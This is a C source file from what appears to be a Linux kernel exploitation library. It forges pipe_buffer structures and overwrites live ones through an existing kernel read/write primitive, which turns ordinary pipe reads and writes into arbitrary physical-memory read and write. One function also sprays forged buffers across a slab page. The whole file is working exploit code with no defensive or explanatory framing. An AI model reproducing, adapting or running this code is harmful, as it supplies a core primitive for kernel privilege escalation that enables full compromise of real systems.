/* lib/rw/pipe_rw.c -- see pipe_rw.h. */
#include <string.h>
#include <unistd.h>

#include "pipe_rw.h"
#include "../addr/physmap.h"

void lib_pipe_buf_forge(
    struct lib_pipe_buffer *pb, uintptr_t direct_addr, uintptr_t ops,
    size_t len, int for_write) {
  pb->page = lib_direct_to_page(direct_addr);
  pb->offset = (uint32_t)(direct_addr & (PAGE_SIZE - 1));
  pb->len = for_write ? 0 : (uint32_t)(len + 1);
  pb->ops = ops;
  pb->flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb->pad = 0;
  pb->priv = 0;
}

int lib_pipe_phys_read(
    const struct lib_meta_rw *meta, int pipefd[2], uintptr_t buf_addr,
    uintptr_t direct_addr, uintptr_t ops, void *out, size_t len) {
  struct lib_pipe_buffer saved;
  if (meta->read(meta->ctx, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct lib_pipe_buffer pb = saved;
  lib_pipe_buf_forge(&pb, direct_addr, ops, len, 0);

  if (meta->write(meta->ctx, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  meta->write(meta->ctx, buf_addr, &saved, sizeof(saved));
  return ok;
}

int lib_pipe_phys_write(
    const struct lib_meta_rw *meta, int pipefd[2], uintptr_t buf_addr,
    uintptr_t direct_addr, uintptr_t ops, const void *data, size_t len) {
  struct lib_pipe_buffer saved;
  if (meta->read(meta->ctx, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct lib_pipe_buffer pb = saved;
  lib_pipe_buf_forge(&pb, direct_addr, ops, len, 1);

  if (meta->write(meta->ctx, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  meta->write(meta->ctx, buf_addr, &saved, sizeof(saved));
  return ok;
}

void lib_forge_pipe_buffers_on_page(
    const struct lib_meta_rw *meta, uintptr_t base, uintptr_t direct_addr,
    uintptr_t ops, size_t len, int for_write, size_t slab_size, size_t obj_size) {
  struct lib_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  lib_pipe_buf_forge(&pb, direct_addr, ops, len, for_write);

  for (size_t off = 0; off < slab_size; off += obj_size) {
    meta->write(meta->ctx, base + off, &pb, sizeof(pb));
  }
}
